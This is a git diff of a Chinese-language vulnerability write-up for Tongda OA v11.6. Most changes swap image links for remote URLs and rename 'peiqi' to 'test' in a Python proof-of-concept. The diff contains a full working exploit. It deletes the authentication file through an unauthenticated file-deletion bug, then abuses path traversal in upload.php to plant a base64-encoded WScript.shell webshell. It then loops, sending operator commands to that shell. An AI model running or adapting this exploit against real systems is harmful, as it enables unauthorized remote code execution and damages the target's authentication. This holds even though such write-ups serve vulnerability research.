@@ -165,13 +165,13 @@ echo "<body>\r\n</body>\r\n</html>";
 include_once "inc/auth.inc.php";
 ```
 
-![](image/tongdaoa-19.png)
+![](http://wikioss.peiqi.tech/vuln/tongdaoa-19.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 可以看到这个文件用于检验是否登录，未登录的情况无法利用这个漏洞
 
 查看 **\webroot\module\appbuilder\assets\print.php**文件
 
-![](image/tongdaoa-20.png)
+![](http://wikioss.peiqi.tech/vuln/tongdaoa-20.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```php
 <?php
@@ -199,7 +199,7 @@ else {
 
 回到 upload.php 文件进行代码审计
 
-![](image/tongdaoa-21.png)
+![](http://wikioss.peiqi.tech/vuln/tongdaoa-21.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 判断变量 **$action** 是否为 upload，再判断文件类型，如果不为 xls 和 img 则进入else分支
 
@@ -281,13 +281,13 @@ else {
 
 使用POC来利用漏洞
 
-![](image/tongdaoa-22.png)
+![](http://wikioss.peiqi.tech/vuln/tongdaoa-22.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 > [!NOTE]
 >
 > 注意在删除验证身份的文件后，会造成后台页面出现如下图，使用前备份文件
 
-![](image/tongdaoa-23.png)
+![](http://wikioss.peiqi.tech/vuln/tongdaoa-23.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞利用POC
 
@@ -307,8 +307,6 @@ import sys
 def title():
     print('+------------------------------------------')
     print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
-    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
-    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
     print('+  \033[34mVersion: 通达OA v11.6 任意文件删除&RCE                                \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                           \033[0m')
     print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx                                 \033[0m')
@@ -346,7 +344,7 @@ def POC_3(target_url, payload_php):
     """
       (绕过的webshell)
       <?php
-      $command=$_GET['peiqi'];
+      $command=$_GET['test'];
       $wsh = new COM('WScript.shell');
       $exec = $wsh->exec("cmd /c ".$command);
       $stdout = $exec->StdOut();
@@ -354,13 +352,13 @@ def POC_3(target_url, payload_php):
       echo $stroutput;
       ?>
     """
-    vuln_url = target_url + "/general/data_center/utils/upload.php?action=upload&filetype=peiqi&repkid=/.<>./.<>./.<>./"
-    files = {'FILE1': ('peiqi.php', payload_php)}
+    vuln_url = target_url + "/general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./"
+    files = {'FILE1': ('test.php', payload_php)}
     try:
         vuln_response = requests.post(url = vuln_url,files=files)
         if vuln_response.status_code == 200:
-            print("\033[32m[o] 成功写入webshell文件: _peiqi.php \033[0m")
-            print("\033[32m[o] webshell地址为: {}/_peiqi.php \033[0m".format(target_url))
+            print("\033[32m[o] 成功写入webshell文件: _test.php \033[0m")
+            print("\033[32m[o] webshell地址为: {}/_test.php \033[0m".format(target_url))
         else:
             print("\033[31m[x] 写入webshell文件失败 \033[0m")
             sys.exit(0)
@@ -369,7 +367,7 @@ def POC_3(target_url, payload_php):
         sys.exit(0)
 
 def POC_4(target_url, cmd):
-    cmd_url = target_url + "/_peiqi.php?peiqi={}".format(cmd)
+    cmd_url = target_url + "/_test.php?test={}".format(cmd)
     try:
         cmd_response = requests.get(url = cmd_url)
         if cmd_response.status_code == 200:
@@ -387,7 +385,7 @@ if __name__ == '__main__':
     target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
     POC_1(target_url)
     POC_2(target_url)
-    payload_php = base64.b64decode("PD9waHAKICAgICRjb21tYW5kPSRfR0VUWydwZWlxaSddOwogICAgJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKICAgICRleGVjID0gJHdzaC0+ZXhlYygiY21kIC9jICIuJGNvbW1hbmQpOwogICAgJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKICAgICRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CiAgICBlY2hvICRzdHJvdXRwdXQ7Cj8+").decode("utf-8")
+    payload_php = base64.b64decode("PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=").decode("utf-8")
     POC_3(target_url, payload_php)
 
     while True:
@@ -396,6 +394,9 @@ if __name__ == '__main__':
             sys.exit(0)
         else:
             POC_4(target_url, cmd)
+
+
+
 ```
 
-![](image/tongdaoa-24.png)
+![](http://wikioss.peiqi.tech/vuln/tongdaoa-24.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
